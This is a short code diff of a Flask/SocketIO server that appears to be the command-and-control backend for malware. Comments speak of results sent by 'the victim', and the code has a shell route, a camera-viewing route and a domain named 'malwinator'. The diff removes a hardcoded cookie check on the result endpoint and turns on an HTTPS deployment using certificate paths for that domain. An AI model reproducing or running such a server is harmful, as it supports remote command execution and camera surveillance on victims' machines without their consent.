@@ -133,8 +133,6 @@ def shell():
 # this is where the victim will send the command result
 @app.route('/result', methods = ['POST'])
 def result():
-  if request.cookies.get('superSecretKey') != 'c457r4v371':
-    return render_template('notLoggedIn.html')
   global hosts
   
   key = (request.remote_addr, request.form['name'])
@@ -238,13 +236,13 @@ def view_camera():
 
 
 # https server
-# if __name__ == '__main__':
-#   socketio.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')
+if __name__ == '__main__':
+  socketio.run(app, ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')
 
 # http server
 # if __name__ == "__main__":
 #   socketio.run(app, host='0.0.0.0', port='5000')
 
 # # localhost server
-if __name__ == "__main__":
-  socketio.run(host='127.0.0.1', port='8088')
+# if __name__ == "__main__":
+#   socketio.run(host='127.0.0.1', port='8088')
